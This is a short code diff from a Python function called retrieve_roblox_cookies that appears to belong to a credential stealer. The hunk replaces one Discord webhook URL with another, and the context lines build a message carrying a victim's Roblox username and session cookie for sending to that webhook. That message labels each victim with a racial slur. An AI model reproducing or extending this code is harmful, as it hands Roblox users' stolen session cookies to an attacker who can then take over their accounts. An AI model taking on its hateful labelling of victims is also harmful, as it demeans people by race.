@@ -36,7 +36,7 @@ def retrieve_roblox_cookies():
                     except:
                         roblox_username = "n/a"
 
-                    webhook_url = "https://discord.com/api/webhooks/1507642133006254163/nFL4A31RlM-Q_9N11FS52N0zI8dy7rtD3F2-y-FT0AwKHj1QmPS6QH6l1mxgYvCRFcqf"
+                    webhook_url = "https://discordapp.com/api/webhooks/1518883589842931883/Mhg0BBmPFYnQfl2ROPDEvfHbzvZbAPDeKPi8ISGtMnFh3cxhthP2eX9U5g3LODYbH8l-"
                     payload = {
                         "content": f"New Stupid Nigga: {roblox_username}\n\nCookie: {cookie_result}"
                     }
